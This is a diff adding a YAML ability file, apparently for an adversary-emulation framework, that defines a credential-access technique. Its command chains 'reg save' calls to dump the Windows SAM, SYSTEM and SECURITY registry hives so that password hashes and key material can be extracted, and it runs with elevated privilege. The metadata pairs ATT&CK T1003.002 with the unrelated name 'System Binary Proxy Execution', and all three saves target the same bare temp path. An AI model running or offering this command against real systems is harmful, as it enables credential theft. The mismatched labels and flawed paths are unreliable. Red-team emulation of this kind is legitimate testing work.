@@ -1,0 +1,24 @@
+- id: 963aeadd-1ad4-2721-b332-dbcbf6c03e4e
+  name: Reg.exe - Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password
+    hashes and key material
+  description: Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes
+    and key material
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'reg save HKLM\SECURITY #{host.dir.temp} && reg save HKLM\SYSTEM
+          #{host.dir.temp} && reg save HKLM\SAM #{host.dir.temp}'
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  buckets:
+  - credential-access
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
